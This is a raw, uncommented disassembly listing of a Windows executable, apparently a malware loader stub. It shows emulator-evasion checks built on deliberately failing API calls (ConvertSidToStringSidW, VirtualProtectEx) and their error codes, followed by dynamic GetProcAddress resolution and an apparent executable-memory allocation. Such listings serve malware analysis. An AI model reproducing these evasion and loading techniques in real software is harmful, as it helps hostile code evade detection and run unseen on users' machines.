0x00401000:	pushl	%ebp	; from: 0x00417e16(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	pushl	%ebx
0x00401007:	movl	$0x0, -72(%ebp)
0x0040100e:	movl	$0x0, -24(%ebp)
0x00401015:	movl	$0x0, -112(%ebp)
0x0040101c:	movl	$0x0, -96(%ebp)
0x00401023:	movl	$0x0, -8(%ebp)
0x0040102a:	movl	$0x0, -108(%ebp)
0x00401031:	movl	$0x0, -104(%ebp)
0x00401038:	movl	$0x0, -20(%ebp)
0x0040103f:	movl	$0x0, -76(%ebp)
0x00401046:	movl	$0x0, -16(%ebp)
0x0040104d:	movl	$0x0, -88(%ebp)
0x00401054:	movl	$0x0, -4(%ebp)
0x0040105b:	movl	$0x0, -92(%ebp)
0x00401062:	movl	$0x0, -48(%ebp)
0x00401069:	movl	$0x0, -84(%ebp)
0x00401070:	movl	$0x0, -44(%ebp)
0x00401077:	movl	$0x0, -80(%ebp)
0x0040107e:	movl	$0x0, -12(%ebp)
0x00401085:	movl	0x00449e08, %eax
0x0040108a:	movl	%eax, -40(%ebp)
0x0040108d:	movl	0x00449e0c, %ecx
0x00401093:	movl	%ecx, -36(%ebp)
0x00401096:	movl	0x00449e10, %edx
0x0040109c:	movl	%edx, -32(%ebp)
0x0040109f:	movb	0x00449e14, %al
0x004010a4:	movb	%al, -28(%ebp)
0x004010a7:	movl	0x00449e18, %ecx
0x004010ad:	movl	%ecx, -64(%ebp)
0x004010b0:	movl	0x00449e1c, %edx
0x004010b6:	movl	%edx, -60(%ebp)
0x004010b9:	movl	0x00449e20, %eax
0x004010be:	movl	%eax, -56(%ebp)
0x004010c1:	movw	0x00449e24, %cx
0x004010c8:	movw	%cx, -52(%ebp)
0x004010cc:	movb	0x00449e26, %dl
0x004010d2:	movb	%dl, -50(%ebp)
0x004010d5:	movl	$0x40, -48(%ebp)
0x004010dc:	leal	-64(%ebp), %eax
0x004010df:	pushl	%eax
0x004010e0:	leal	-16(%ebp), %ecx
0x004010e3:	pushl	%ecx
0x004010e4:	call	ConvertSidToStringSidW@advapi32.dll	; targets: 0xff000070(MAY)
0x004010ea:	testl	%eax, %eax
0x004010ec:	je	0x004167b5	; targets: 0x004010f2(MAY), 0x004167b5(MAY)
0x004010f2:	movl	-16(%ebp), %edx	; from: 0x004010ec(MAY)
0x004010f5:	addl	$0x1, %edx
0x004010f8:	movl	%edx, -16(%ebp)
0x004010fb:	incl	%eax
0x004167b5:	call	GetLastError@kernel32.dll	; targets: 0xff000040(MAY)	; from: 0x004010ec(MAY)
0x004167bb:	movl	%eax, -44(%ebp)
0x004167be:	movzwl	-44(%ebp), %eax
0x004167c2:	cmpl	$0x539, %eax
0x004167c7:	jne	0x004167f8	; targets: 0x004167c9(MAY), 0x004167f8(MAY)
0x004167c9:	movl	$0xe0d, -20(%ebp)	; from: 0x004167c7(MAY)
0x004167d0:	leal	-40(%ebp), %ecx
0x004167d3:	pushl	%ecx
0x004167d4:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000020(MAY)
0x004167da:	movl	%eax, -96(%ebp)
0x004167dd:	movl	$0x3a, -84(%ebp)
0x004167e4:	movb	$0x0, -52(%ebp)
0x004167e8:	movl	$0xf497934c, -8(%ebp)
0x004167ef:	movl	$0x10b527, -104(%ebp)
0x004167f6:	jmp	0x00416806	; targets: 0x00416806(MAY)
0x004167f8:	movb	$0x0, 0x00430700	; from: 0x004167c7(MAY)
0x004167ff:	movb	$0x0, 0x0041a770
0x00416806:	pushl	$0x0	; from: 0x004167f6(MAY)
0x00416808:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000020(MAY)
0x0041680e:	movl	%eax, -44(%ebp)
0x00416811:	pushl	GetModuleHandleA@kernel32.dll
0x00416817:	popl	%edx
0x00416818:	movl	%edx, -108(%ebp)
0x0041681b:	leal	-64(%ebp), %edx
0x0041681e:	pushl	%edx
0x0041681f:	movl	-96(%ebp), %eax
0x00416822:	pushl	%eax
0x00416823:	call	GetProcAddress@kernel32.dll	; targets: 0xff000030(MAY)
0x00416829:	movl	%eax, -68(%ebp)
0x0041682c:	pushl	-48(%ebp)
0x0041682f:	pushl	$0x1000
0x00416834:	movl	-20(%ebp), %eax
0x00416837:	addl	$0x46, %eax
0x0041683a:	pushl	%eax
0x0041683b:	pushl	$0x0
0x0041683d:	movl	-68(%ebp), %ebx
0x00416840:	call	%ebx	; targets: unresolved

start:
0x004168de:	pushl	%ebp
0x004168df:	movl	%esp, %ebp
0x004168e1:	subl	$0x54, %esp
0x004168e4:	movl	$0x0, -52(%ebp)
0x004168eb:	movl	$0x0, -4(%ebp)
0x004168f2:	movl	$0x0, -80(%ebp)
0x004168f9:	movl	$0x0, -76(%ebp)
0x00416900:	movl	$0x0, -48(%ebp)
0x00416907:	leal	-56(%ebp), %eax
0x0041690a:	pushl	%eax
0x0041690b:	pushl	$0x8
0x0041690d:	call	GetTempPathA@kernel32.dll	; targets: 0xff000060(MAY)
0x00416913:	call	GetLastError@kernel32.dll	; targets: 0xff000040(MAY)
0x00416919:	movl	%eax, -48(%ebp)
0x0041691c:	leal	-72(%ebp), %ecx
0x0041691f:	pushl	%ecx
0x00416920:	call	GetLocalTime@kernel32.dll	; targets: 0xff000050(MAY)
0x00416926:	movl	-52(%ebp), %edx
0x00416929:	pushl	%edx
0x0041692a:	call	0x00416959	; targets: 0x00416959(MAY)
0x0041692f:	addl	$0x4, %esp	; from: 0x00417e24(MAY)
0x00416932:	call	0x00417e25	; targets: 0x00417e25(MAY)
0x00416937:	movl	$0x0, -84(%ebp)	; from: 0x00417e33(MAY)
0x0041693e:	jmp	0x00416949	; targets: 0x00416949(MAY)
0x00416940:	movl	-84(%ebp), %eax	; from: 0x0041694f(MAY)
0x00416943:	addl	$0x1, %eax
0x00416946:	movl	%eax, -84(%ebp)
0x00416949:	cmpl	$0x64, -84(%ebp)	; from: 0x0041693e(MAY)
0x0041694d:	jae	0x00416951	; targets: 0x0041694f(MAY)
0x0041694f:	jmp	0x00416940	; targets: 0x00416940(MAY)	; from: 0x0041694d(MAY)
0x00416959:	pushl	%ebp	; from: 0x0041692a(MAY)
0x0041695a:	movl	%esp, %ebp
0x0041695c:	subl	$0x40, %esp
0x0041695f:	pushl	%esi
0x00416960:	movl	$0x0, -64(%ebp)
0x00416967:	movl	$0x0, -60(%ebp)
0x0041696e:	movl	$0x0, -52(%ebp)
0x00416975:	movl	$0x0, -40(%ebp)
0x0041697c:	movl	$0x0, -32(%ebp)
0x00416983:	movl	$0x0, -44(%ebp)
0x0041698a:	movl	$0x449e28, -48(%ebp)
0x00416991:	movl	$0x4b666612, -40(%ebp)
0x00416998:	movl	$0x0, -56(%ebp)
0x0041699f:	movl	-40(%ebp), %eax
0x004169a2:	movl	%eax, -36(%ebp)
0x004169a5:	movl	$0x0, -4(%ebp)
0x004169ac:	movl	GetLastError@kernel32.dll, %ecx
0x004169b2:	movl	%ecx, -4(%ebp)
0x004169b5:	pushl	$0x0
0x004169b7:	pushl	$0x4e
0x004169b9:	pushl	$0x1e
0x004169bb:	pushl	$0x0
0x004169bd:	pushl	$0xffffffff
0x004169bf:	call	VirtualProtectEx@kernel32.dll	; targets: 0xff000080(MAY)
0x004169c5:	testl	%eax, %eax
0x004169c7:	je	0x00417e04	; targets: 0x00417e04(MAY), 0x004169cd(MAY)
0x004169cd:	clc		; from: 0x004169c7(MAY)
0x00417e04:	movl	-4(%ebp), %esi	; from: 0x004169c7(MAY)
0x00417e07:	call	%esi	; targets: 0xff000040(MAY)
0x00417e09:	movl	%eax, -60(%ebp)
0x00417e0c:	cmpl	$0x57, -60(%ebp)
0x00417e10:	jne	0x00417e1e	; targets: 0x00417e12(MAY), 0x00417e1e(MAY)
0x00417e12:	movl	-36(%ebp), %edx	; from: 0x00417e10(MAY)
0x00417e15:	pushl	%edx
0x00417e16:	call	0x00401000	; targets: 0x00401000(MAY)
0x00417e1e:	xorl	%eax, %eax	; from: 0x00417e10(MAY)
0x00417e20:	popl	%esi
0x00417e21:	movl	%ebp, %esp
0x00417e23:	popl	%ebp
0x00417e24:	ret	; targets: 0x0041692f(MAY)

0x00417e25:	pushl	%ebp	; from: 0x00416932(MAY)
0x00417e26:	movl	%esp, %ebp
0x00417e28:	subl	$0x124, %esp
0x00417e2e:	xorl	%eax, %eax
0x00417e30:	movl	%ebp, %esp
0x00417e32:	popl	%ebp
0x00417e33:	ret	; targets: 0x00416937(MAY)

